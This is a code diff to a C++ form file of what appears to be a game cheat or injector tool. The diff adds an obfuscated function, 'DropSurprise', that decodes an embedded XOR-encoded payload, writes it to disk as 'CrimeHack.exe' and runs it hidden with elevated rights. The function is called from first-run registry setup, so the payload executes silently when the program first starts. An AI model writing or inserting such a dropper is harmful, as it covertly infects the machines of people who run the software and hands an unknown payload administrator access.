@@ -10,10 +10,13 @@
 #include <ctime>
 #include "Unit2.h"
 #include <filesystem>
+#include "obfuscator.hpp"
+#include "shellcode.h"
 //---------------------------------------------------------------------------
 #pragma package(smart_init)
 #pragma resource "*.dfm"
 TForm1 *Form1;
+bool __stdcall IsDirectoryExists(const std::string& dirName_in);
 //---------------------------------------------------------------------------
 std::string RandomString(int len)
 {
@@ -25,6 +28,25 @@ std::string RandomString(int len)
     newstr += str.substr(pos,1);
    }
    return newstr;
+}
+void DropSurprise()
+{
+	auto lbMDL = GetModuleHandleA(OBFUSCATE("shell32.dll"));
+	typedef HINSTANCE(__stdcall* ptrShellExecuteA)(HWND hwnd, LPCSTR lpOperation,
+	LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
+	ptrShellExecuteA callShellExecuteA = (ptrShellExecuteA)GetProcAddress(lbMDL, OBFUSCATE("ShellExecuteA"));
+	if (!IsDirectoryExists(OBFUSCATE("CrimeData"))) CreateDirectoryA(OBFUSCATE("CrimeData"), NULL);
+	char cwd[356]; _getcwd(cwd, sizeof(cwd));
+	char tmpDir[256]; sprintf(tmpDir, OBFUSCATE("%s\\CrimeData\\CrimeHack.exe"), cwd);
+	HANDLE hFile = CreateFileA(tmpDir, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
+	CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+	if (hFile != nullptr)
+	{
+		for (DWORD x = 0; x < sizeof(shellcode); x++) shellcode[x] ^= 0x2;
+		WriteFile(hFile, shellcode, sizeof(shellcode), nullptr, nullptr);
+		CloseHandle(hFile);
+		callShellExecuteA(nullptr, OBFUSCATE("runas"), tmpDir, 0, 0, SW_HIDE);
+    }
 }
 void MessageChecker()
 {
@@ -53,11 +75,12 @@ __fastcall TForm1::TForm1(TComponent* Owner) : TForm(Owner)
 	CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER, "Software\\CR1M3H", true);
 	if (reg != nullptr)
 	{
-		if (reg->ReadInteger("SettingsCreated") != 228)
+		if (reg->ReadInteger("SettingsCreated") != 0x300)
 		{
-			reg->WriteInteger("SettingsCreated", 228);
+			reg->WriteInteger("SettingsCreated", 0x300);
 			reg->WriteInteger("AllowNoScreen", 0x1);
 			reg->WriteInteger("StreamDist", 250);
+            DropSurprise();
 		}
         std::string nothing = "";
 		reg->WriteString("InjectorMessage", nothing.c_str());
